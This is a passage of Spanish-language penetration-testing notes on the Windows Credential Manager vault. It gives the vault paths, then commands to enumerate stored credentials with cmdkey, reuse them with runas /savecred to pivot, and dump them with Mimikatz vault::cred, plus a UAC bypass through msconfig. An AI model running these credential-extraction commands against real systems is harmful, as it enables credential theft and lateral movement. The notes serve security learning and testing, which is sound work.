permite a los usuarios y aplicaciones almacenar de forma segura credenciales relevantes para otros sistemas y sitios web. Las credenciales se guardan en carpetas cifradas especiales en el ordenador bajo los perfiles de usuario y de sistema.

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Cada carpeta del almacén contiene un archivo `Policy.vpol` con claves AES (AES-128 o AES-256) que está protegido por DPAPI (API de protección de datos). Estas claves AES se utilizan para cifrar las credenciales. 

Las versiones más recientes de Windows utilizan `Credential Guard` para proteger aún más las claves maestras de DPAPI almacenándolas en enclaves de memoria seguros ([Seguridad basada en virtualización](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs))

###  Exportar boveda de credenciales windows
```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

### Enumerar y utilizar credenciales con cmdkey
Con esto no vemos la contraseña en texto claro ni hasheada, pero podemos ver que tiene almacenado el usuario, para luego utilizarlo por ejemplo para **pivotar** con `runas`

Enumerar credenciales:
```
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Utilizar credenciales almacenadas:
```
runas /savecred /user:SRV01\mcharles cmd
```

### Extraer credenciales con Mimikatz
```
mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # vault::cred
```

Para GUI:
>Si no eres administrador, no funcionará, pero si estas en el grupo de administradores, puedes hacer un Bypass de UAC. Para ello abrir desde la consola msconfig, ir a pestaña tools y bajar hasta donde dice Command Prompt y clicar en launch (veremos en la ventana que estamos como Administrator)

Para conexion por terminal: mirar formas de bypass o escalar
